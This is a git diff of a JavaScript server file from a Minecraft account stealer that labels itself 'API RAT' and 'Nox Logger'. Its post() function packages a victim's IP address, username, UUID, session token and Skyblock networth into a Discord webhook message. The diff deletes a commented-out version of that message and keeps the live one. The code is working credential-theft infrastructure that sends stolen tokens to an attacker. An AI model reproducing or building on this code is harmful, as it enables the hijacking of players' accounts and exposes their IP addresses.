@@ -69,49 +69,6 @@ app.post('/', (req, res) => {
 });
 
 function post(ip, username, uuid, token, webhook, networth, description) {
-//    let embeds = [
-//        {
-//            title: "📖 Minecraft Info",
-//            description: "🪙 Networth: " + networth,
-//            color: 0x7289DA,
-//            footer: {
-//                "text": "🌟 API RAT by Gute Nacht 🌟",
-//            },
-//            timestamp: new Date(),
-//            fields: [
-//                {
-//                    name: "IP",
-//                    value: "```" + ip + "```",
-//                    inline: true
-//                },
-//                {
-//                    name: "Username",
-//                    value: "```" + username + "```",
-//                    inline: true
-//                },
-//                {
-//                    name: "UUID",
-//                    value: "```" + uuid + "```",
-//                    inline: true
-//                },
-//                {
-//                    name: "Token",
-//                    value: "```" + token + "```",
-//                    inline: false
-//                },
-//            ]
-//        },
-//        {
-//            title: "🌍 Skyblock Profile Info",
-//            color: 0x7289DA,
-//            fields: description,
-//            url: "https://sky.shiiyu.moe/stats/" + username,
-//            footer: {
-//                "text": "🌟 API RAT by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
-//            }
-//        }
-//    ]
-
     let embed = {
         username: "Nox Logger",
         avatar_url: "https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png",
